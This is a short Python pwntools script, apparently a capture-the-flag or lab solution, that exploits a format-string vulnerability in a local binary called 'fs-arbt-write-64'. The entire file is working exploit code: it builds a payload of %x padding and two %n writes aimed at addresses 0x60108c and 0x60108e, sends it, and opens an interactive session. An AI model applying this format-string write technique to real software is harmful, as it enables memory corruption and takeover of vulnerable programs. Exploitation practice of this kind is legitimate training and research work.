#!/usr/bin/env python
from pwn import *
y = 1
x = 9
p = process('./fs-arbt-write-64')
p.recv()
buf = '%45068x'
buf += '%'
buf += str(x)
buf += '$n'
buf += '%19138x'
buf += '%'
buf += str(x+1)
buf += '$n'
buf += 'A'*y #padding
buf += p64(0x60108c)
buf += p64(0x60108e) #+2
print(buf)
p.sendline(buf)
print(p.read())
p.interactive()
print('x = ' + str(x))
print('y = ' + str(y))
p.close()